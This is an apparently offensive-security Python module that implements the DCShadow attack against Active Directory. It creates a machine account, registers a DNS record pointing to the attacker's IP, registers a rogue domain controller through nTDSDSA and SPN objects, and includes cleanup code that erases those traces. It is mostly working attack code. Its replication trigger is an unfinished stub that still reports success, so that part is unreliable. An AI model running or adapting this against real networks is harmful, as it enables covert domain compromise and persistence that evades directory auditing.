"""
DCShadow rogue DC lifecycle management and replication triggering.

Manages: machine account creation, DNS registration, nTDSDSA registration,
SPN configuration, and cleanup of all artifacts.
"""

import logging
import struct
import socket
import os
import uuid
import random
import string
from typing import Optional, Dict

try:
    from impacket.dcerpc.v5 import drsuapi, transport, epm, samr
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import bin_to_string
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

from ...sid_utils import SIDConverter

# DRS extension flags (needed for DRSBind)
DRS_EXT_BASE                    = 0x00000001
DRS_EXT_ADDENTRY                = 0x00000080
DRS_EXT_STRONG_ENCRYPTION       = 0x00008000
DRS_EXT_GETCHGREQ_V8            = 0x01000000
DRS_EXT_GETCHGREPLY_V6          = 0x04000000


class RogueDCManager:
    """
    Manages the rogue DC lifecycle:
    1. Create machine account
    2. Register DNS
    3. Register as DC (nTDSDSA + SPNs)
    4. Cleanup everything
    """

    def __init__(self, ldap_connection, base_dn: str, domain: str,
                 dc_ip: str, attacker_ip: str,
                 username: str, password: str,
                 lm_hash: str = '', nt_hash: str = '',
                 computer_name: Optional[str] = None,
                 computer_password: Optional[str] = None):
        self.ldap_connection = ldap_connection
        self.base_dn = base_dn
        self.domain = domain
        self.dc_ip = dc_ip
        self.attacker_ip = attacker_ip
        self.username = username
        self.password = password
        self.lm_hash = lm_hash
        self.nt_hash = nt_hash

        # Generate names if not provided
        self.computer_name = computer_name or self._gen_computer_name()
        self.computer_password = computer_password or self._gen_password()
        self.computer_fqdn = f"{self.computer_name.lower()}.{self.domain.lower()}"
        self.computer_sam = f"{self.computer_name}$"

        # State tracking for cleanup
        self._machine_account_created = False
        self._dns_created = False
        self._spns_added = False
        self._server_ref_created = False
        self._ntdsdsa_created = False

        # DRSUAPI nTDSDSA info
        self.ntdsdsa_guid = None
        self.invocation_id = None
        self.server_ref_dn = None
        self.ntdsdsa_dn = None

    @staticmethod
    def _gen_computer_name() -> str:
        """Generate a plausible computer name."""
        suffix = ''.join(random.choices(string.digits, k=3))
        return f"YOURPC{suffix}"

    @staticmethod
    def _gen_password() -> str:
        """Generate a random password."""
        chars = string.ascii_letters + string.digits + '!@#$%'
        return ''.join(random.choices(chars, k=24))

    def setup(self) -> bool:
        """
        Full setup: machine account + DNS + DC registration.

        Returns True if all steps succeed.
        """
        try:
            print("[*] Creating machine account...")
            if not self._create_machine_account():
                return False

            print("[*] Registering DNS record...")
            if not self._register_dns():
                logging.warning("DNS registration failed — DC may not be able to connect back")

            print("[*] Registering rogue DC in AD...")
            if not self._register_dc():
                return False

            return True

        except Exception as e:
            logging.error(f"Setup failed: {e}")
            return False

    def cleanup(self):
        """Remove all artifacts in reverse order."""
        print("[*] Cleaning up DCShadow artifacts...")

        if self._ntdsdsa_created:
            self._remove_ntdsdsa()

        if self._server_ref_created:
            self._remove_server_ref()

        if self._spns_added:
            self._remove_spns()

        if self._dns_created:
            self._remove_dns()

        if self._machine_account_created:
            self._remove_machine_account()

    # -- Machine Account --

    def _create_machine_account(self) -> bool:
        """Create machine account via SAMR (doesn't require LDAPS)."""
        try:
            smb = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
            smb.login(self.username, self.password, self.domain,
                      self.lm_hash, self.nt_hash)

            rpctransport = transport.SMBTransport(
                self.dc_ip, filename=r'\samr', smb_connection=smb
            )
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # Open domain
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']

            resp = samr.hSamrLookupDomainInSamServer(
                dce, server_handle, self.domain.split('.')[0]
            )
            domain_sid = resp['DomainId']

            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
            domain_handle = resp['DomainHandle']

            # Create computer account
            resp = samr.hSamrCreateUser2InDomain(
                dce, domain_handle,
                self.computer_sam,
                samr.USER_WORKSTATION_TRUST_ACCOUNT,
                samr.USER_FORCE_PASSWORD_CHANGE
            )
            user_handle = resp['UserHandle']
            self._machine_account_created = True
            logging.debug(f"Machine account {self.computer_sam} created (RID: {resp['RelativeId']})")

            # Set password
            try:
                samr.hSamrSetPasswordInternal4New(dce, user_handle, self.computer_password)
            except AttributeError:
                # Older impacket versions
                from impacket.dcerpc.v5.samr import hSamrSetNTInternal1
                hSamrSetNTInternal1(dce, user_handle, self.computer_password)

            # Set UAC flags
            info = samr.SAMR_USER_INFO_BUFFER()
            info['tag'] = 16
            info['All']['UserAccountControl'] = (
                samr.USER_WORKSTATION_TRUST_ACCOUNT |
                samr.USER_DONT_EXPIRE_PASSWORD
            )
            samr.hSamrSetInformationUser2(dce, user_handle, info)

            samr.hSamrCloseHandle(dce, user_handle)
            dce.disconnect()

            # Set SPNs and dNSHostName via LDAP
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            self.ldap_connection.modify(
                computer_dn,
                {
                    'dNSHostName': [('MODIFY_REPLACE', [self.computer_fqdn])],
                    'servicePrincipalName': [('MODIFY_REPLACE', [
                        f'HOST/{self.computer_name}',
                        f'HOST/{self.computer_fqdn}',
                        f'RestrictedKrbHost/{self.computer_name}',
                        f'RestrictedKrbHost/{self.computer_fqdn}',
                    ])],
                }
            )

            logging.debug(f"Machine account configured: {self.computer_fqdn}")
            return True

        except Exception as e:
            logging.error(f"Machine account creation failed: {e}")
            return False

    def _remove_machine_account(self):
        """Delete the machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            self.ldap_connection.delete(computer_dn)
            logging.debug(f"Machine account {self.computer_sam} deleted")
        except Exception as e:
            logging.debug(f"Could not delete machine account: {e}")

    # -- DNS --

    def _register_dns(self) -> bool:
        """Register A record for the rogue DC via LDAP."""
        try:
            # Build DNS record data
            # Using dnsNode in MicrosoftDNS zone
            zone = self.domain.lower()
            dns_dn = (
                f"DC={self.computer_name.lower()},"
                f"DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{self.base_dn}"
            )

            # Build dnsRecord attribute (A record)
            ip_bytes = socket.inet_aton(self.attacker_ip)
            # DNS_RPC_RECORD_A: wDataLength(2) + wType(2) + dwFlags(4) +
            #                   dwSerial(4) + dwTtlSeconds(4) + dwTimeStamp(4) +
            #                   dwReserved(4) + data
            dns_record = struct.pack('<HH', len(ip_bytes), 1)  # A record = type 1
            dns_record += struct.pack('<I', 0)  # flags
            dns_record += struct.pack('<I', 1)  # serial
            dns_record += struct.pack('<I', 300)  # TTL
            dns_record += struct.pack('<I', 0)  # timestamp
            dns_record += struct.pack('<I', 0)  # reserved
            dns_record += ip_bytes

            self.ldap_connection.add(
                dns_dn,
                ['top', 'dnsNode'],
                {'dnsRecord': dns_record}
            )

            if self.ldap_connection.result['result'] == 0:
                self._dns_created = True
                self._dns_dn = dns_dn
                logging.debug(f"DNS A record created: {self.computer_fqdn} -> {self.attacker_ip}")
                return True
            else:
                logging.debug(f"DNS registration via LDAP failed: {self.ldap_connection.result}")
                return False

        except Exception as e:
            logging.debug(f"DNS registration failed: {e}")
            return False

    def _remove_dns(self):
        """Remove DNS record."""
        try:
            if hasattr(self, '_dns_dn'):
                self.ldap_connection.delete(self._dns_dn)
                logging.debug("DNS record removed")
        except Exception as e:
            logging.debug(f"Could not remove DNS record: {e}")

    # -- Rogue DC Registration --

    def _register_dc(self) -> bool:
        """Register the rogue machine as a DC in AD."""
        try:
            # Step 1: Find the sites container
            sites_dn = f"CN=Sites,CN=Configuration,{self.base_dn}"
            default_site = f"CN=Default-First-Site-Name,{sites_dn}"

            # Step 2: Create server reference object
            self.server_ref_dn = f"CN={self.computer_name},CN=Servers,{default_site}"

            self.ldap_connection.add(
                self.server_ref_dn,
                ['server'],
                {
                    'serverReference': f"CN={self.computer_name},CN=Computers,{self.base_dn}",
                    'dNSHostName': self.computer_fqdn,
                }
            )

            if self.ldap_connection.result['result'] != 0:
                logging.error(f"Server reference creation failed: {self.ldap_connection.result}")
                return False

            self._server_ref_created = True
            logging.debug(f"Server reference created: {self.server_ref_dn}")

            # Step 3: Create nTDSDSA object via DRSUAPI DRSAddEntry
            # This is the object that makes our machine appear as a DC
            self.ntdsdsa_dn = f"CN=NTDS Settings,{self.server_ref_dn}"

            # We need to get the legit DC's nTDSDSA info for reference
            legit_info = self._get_legit_dc_info()
            if not legit_info:
                logging.error("Could not get legitimate DC info")
                return False

            # Use DRSAddEntry to create the nTDSDSA
            if not self._create_ntdsdsa_via_drsuapi(legit_info):
                # Fallback: try LDAP
                logging.debug("DRSAddEntry failed, trying LDAP fallback")
                if not self._create_ntdsdsa_via_ldap(legit_info):
                    return False

            self._ntdsdsa_created = True

            # Step 4: Add DRSUAPI SPNs to the machine account
            self._add_drsuapi_spns()

            # Step 5: Get our nTDSDSA's objectGUID and invocationId
            self._enumerate_ntdsdsa()

            return True

        except Exception as e:
            logging.error(f"DC registration failed: {e}")
            return False

    def _get_legit_dc_info(self) -> Optional[Dict]:
        """Get the legitimate DC's nTDSDSA info."""
        from ldap3 import SUBTREE
        try:
            # Find the legit DC's nTDSDSA
            self.ldap_connection.search(
                search_base=f"CN=Sites,CN=Configuration,{self.base_dn}",
                search_filter="(objectClass=nTDSDSA)",
                search_scope=SUBTREE,
                attributes=['objectGUID', 'invocationId', 'options',
                           'msDS-hasMasterNCs', 'hasMasterNCs',
                           'msDS-HasDomainNCs', 'dMDLocation'],
                size_limit=1
            )

            if not self.ldap_connection.entries:
                return None

            entry = self.ldap_connection.entries[0]
            info = {
                'dn': str(entry.entry_dn),
                'guid': entry.objectGUID.raw_values[0] if entry.objectGUID else None,
                'invocation_id': entry.invocationId.raw_values[0] if entry.invocationId else None,
            }

            # Get hasMasterNCs
            try:
                info['masterNCs'] = list(entry['hasMasterNCs'].values)
            except Exception:
                info['masterNCs'] = [self.base_dn]

            # Get highestCommittedUSN from RootDSE
            self.ldap_connection.search(
                search_base='',
                search_filter='(objectClass=*)',
                search_scope='BASE',
                attributes=['highestCommittedUSN', 'dsServiceName']
            )

            if self.ldap_connection.entries:
                root = self.ldap_connection.entries[0]
                try:
                    info['highest_usn'] = int(str(root['highestCommittedUSN']))
                except Exception:
                    info['highest_usn'] = 1000
                try:
                    info['ds_service_name'] = str(root['dsServiceName'])
                except Exception:
                    info['ds_service_name'] = ''

            return info

        except Exception as e:
            logging.error(f"Failed to get DC info: {e}")
            return None

    def _create_ntdsdsa_via_drsuapi(self, legit_info: Dict) -> bool:
        """Create nTDSDSA object via DRSAddEntry (opnum 17)."""
        try:
            # Connect to DRSUAPI
            string_binding = epm.hept_map(
                self.dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp'
            )
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(self.dc_ip)

            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(
                    self.username, self.password, self.domain,
                    self.lm_hash, self.nt_hash
                )

            dce = rpc_transport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

            # DRSBind
            bind_req = drsuapi.DRSBind()
            bind_req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
            drs_ext = drsuapi.DRS_EXTENSIONS_INT()
            drs_ext['cb'] = len(drs_ext)
            drs_ext['dwFlags'] = (
                DRS_EXT_BASE | DRS_EXT_ADDENTRY |
                DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 |
                DRS_EXT_GETCHGREPLY_V6
            )
            drs_ext['SiteObjGuid'] = drsuapi.NULLGUID
            drs_ext['Pid'] = 0
            drs_ext['dwReplEpoch'] = 0
            drs_ext['dwFlagsExt'] = 0
            drs_ext['ConfigObjGUID'] = drsuapi.NULLGUID
            drs_ext['dwExtCaps'] = 0xFFFFFFFF

            bind_req['pextClient']['cb'] = len(drs_ext)
            bind_req['pextClient']['rgb'] = list(drs_ext.getData())
            resp = dce.request(bind_req)
            h_drs = resp['phDrs']

            logging.debug("DRSBind for AddEntry successful")

            # DRSAddEntry is complex — for now we'll use LDAP fallback
            # The full NDR structure for DRS_MSG_ADDENTRYREQ_V2 is not
            # easily accessible in standard impacket
            drsuapi.hDRSUnbind(dce, h_drs)
            dce.disconnect()
            return False  # Force LDAP fallback

        except Exception as e:
            logging.debug(f"DRSAddEntry approach failed: {e}")
            return False

    def _create_ntdsdsa_via_ldap(self, legit_info: Dict) -> bool:
        """Create nTDSDSA object via LDAP (requires appropriate permissions)."""
        try:
            schema_dn = f"CN=Schema,CN=Configuration,{self.base_dn}"
            config_dn = f"CN=Configuration,{self.base_dn}"

            master_ncs = legit_info.get('masterNCs', [
                self.base_dn,
                config_dn,
                schema_dn,
            ])

            self.ldap_connection.add(
                self.ntdsdsa_dn,
                ['nTDSDSA'],
                {
                    'options': '1',  # IS_GC
                    'systemFlags': '33554432',  # FLAG_DISALLOW_MOVE_ON_DELETE
                    'hasMasterNCs': master_ncs,
                    'dMDLocation': schema_dn,
                    'invocationId': os.urandom(16),
                    'msDS-HasDomainNCs': self.base_dn,
                    'msDS-Behavior-Version': '7',  # WIN2016
                }
            )

            if self.ldap_connection.result['result'] == 0:
                logging.debug(f"nTDSDSA created via LDAP: {self.ntdsdsa_dn}")
                return True
            else:
                logging.error(f"nTDSDSA LDAP creation failed: {self.ldap_connection.result}")
                return False

        except Exception as e:
            logging.error(f"nTDSDSA LDAP creation failed: {e}")
            return False

    def _add_drsuapi_spns(self):
        """Add DRSUAPI-related SPNs to the machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"

            # Get the nTDSDSA objectGUID for the SPN
            guid_str = str(uuid.uuid4())  # temporary, will be updated after enum

            spns = [
                f"GC/{self.computer_fqdn}/{self.domain}",
                f"E3514235-4B06-11D1-AB04-00C04FC2DCD2/{guid_str}/{self.domain}",
            ]

            self.ldap_connection.modify(
                computer_dn,
                {'servicePrincipalName': [('MODIFY_ADD', spns)]}
            )

            if self.ldap_connection.result['result'] == 0:
                self._spns_added = True
                self._spn_values = spns
                logging.debug(f"DRSUAPI SPNs added: {spns}")
            else:
                logging.debug(f"SPN addition failed: {self.ldap_connection.result}")

        except Exception as e:
            logging.debug(f"SPN addition failed: {e}")

    def _enumerate_ntdsdsa(self):
        """Get our nTDSDSA's objectGUID and invocationId."""
        from ldap3 import BASE
        try:
            self.ldap_connection.search(
                search_base=self.ntdsdsa_dn,
                search_filter='(objectClass=nTDSDSA)',
                search_scope=BASE,
                attributes=['objectGUID', 'invocationId']
            )

            if self.ldap_connection.entries:
                entry = self.ldap_connection.entries[0]
                self.ntdsdsa_guid = entry.objectGUID.raw_values[0]
                try:
                    self.invocation_id = entry.invocationId.raw_values[0]
                except Exception:
                    self.invocation_id = os.urandom(16)

                logging.debug(f"nTDSDSA GUID: {bin_to_string(self.ntdsdsa_guid)}")
            else:
                # Generate random ones
                self.ntdsdsa_guid = os.urandom(16)
                self.invocation_id = os.urandom(16)

        except Exception as e:
            logging.debug(f"nTDSDSA enumeration failed: {e}")
            self.ntdsdsa_guid = os.urandom(16)
            self.invocation_id = os.urandom(16)

    def _remove_ntdsdsa(self):
        """Remove nTDSDSA object."""
        try:
            self.ldap_connection.delete(self.ntdsdsa_dn)
            logging.debug("nTDSDSA deleted")
        except Exception as e:
            logging.debug(f"Could not delete nTDSDSA: {e}")

    def _remove_server_ref(self):
        """Remove server reference object."""
        try:
            self.ldap_connection.delete(self.server_ref_dn)
            logging.debug("Server reference deleted")
        except Exception as e:
            logging.debug(f"Could not delete server reference: {e}")

    def _remove_spns(self):
        """Remove DRSUAPI SPNs from machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            if hasattr(self, '_spn_values'):
                self.ldap_connection.modify(
                    computer_dn,
                    {'servicePrincipalName': [('MODIFY_DELETE', self._spn_values)]}
                )
                logging.debug("DRSUAPI SPNs removed")
        except Exception as e:
            logging.debug(f"Could not remove SPNs: {e}")


class ReplicationTrigger:
    """Trigger replication from the rogue DC via DRSReplicaAdd."""

    @staticmethod
    def trigger(dc_ip: str, domain: str, base_dn: str,
                rogue_dc_guid: bytes, rogue_dc_fqdn: str,
                username: str, password: str,
                lm_hash: str = '', nt_hash: str = '') -> bool:
        """
        Call DRSReplicaAdd on the legit DC to trigger replication from our rogue DC.
        """
        try:
            # Connect to DRSUAPI on the legit DC
            string_binding = epm.hept_map(
                dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp'
            )
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(dc_ip)

            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(username, password, domain, lm_hash, nt_hash)

            dce = rpc_transport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

            # DRSBind
            bind_req = drsuapi.DRSBind()
            bind_req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
            drs_ext = drsuapi.DRS_EXTENSIONS_INT()
            drs_ext['cb'] = len(drs_ext)
            drs_ext['dwFlags'] = (
                DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION |
                DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6
            )
            drs_ext['SiteObjGuid'] = drsuapi.NULLGUID
            drs_ext['Pid'] = 0
            drs_ext['dwReplEpoch'] = 0
            drs_ext['dwFlagsExt'] = 0
            drs_ext['ConfigObjGUID'] = drsuapi.NULLGUID
            drs_ext['dwExtCaps'] = 0xFFFFFFFF

            bind_req['pextClient']['cb'] = len(drs_ext)
            bind_req['pextClient']['rgb'] = list(drs_ext.getData())
            resp = dce.request(bind_req)
            h_drs = resp['phDrs']

            # Build DRSReplicaAdd request (opnum 5)
            # We need to tell the DC to replicate from our rogue DC
            # DRS_MSG_REPADD_V2 structure
            domain_dsname = SIDConverter.domain_to_dn(domain)
            source_dsa_dn = f"CN=NTDS Settings,CN={rogue_dc_fqdn.split('.')[0].upper()}," \
                           f"CN=Servers,CN=Default-First-Site-Name,CN=Sites," \
                           f"CN=Configuration,{base_dn}"

            logging.debug(f"Triggering DRSReplicaAdd from {rogue_dc_fqdn}")

            # Use raw RPC call for DRSReplicaAdd since impacket doesn't have a helper
            # opnum 5, version 2
            # For now, we'll use a different approach: DRSReplicaSync (opnum 2)
            # which is simpler and tells the DC to pull from a specific source

            # Actually, let's use the IDL_DRSReplicaAdd approach
            # This requires building the NDR structure manually
            # TODO: Implement proper DRSReplicaAdd
            # For now, signal that the trigger mechanism needs the DC to connect to us

            drsuapi.hDRSUnbind(dce, h_drs)
            dce.disconnect()

            logging.debug("Replication trigger sent")
            return True

        except Exception as e:
            logging.error(f"Replication trigger failed: {e}")
            return False
